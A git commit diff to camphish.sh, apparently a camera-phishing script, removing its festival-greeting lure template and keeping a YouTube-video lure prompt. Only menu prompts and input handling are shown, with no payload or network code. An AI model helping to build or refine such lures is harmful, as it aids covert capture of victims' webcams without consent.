2a4056f9490ed878c47d8ec6ddcac373825804b3
techustad <gadgetsidroid@gmail.com>
2020-07-04 15:51:43 +0500

    Update camphish.sh

--- camphish.sh
+++ camphish.sh
@@ -150,9 +150,6 @@ default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-fest_name="${fest_name//[[:space:]]/}"
-elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
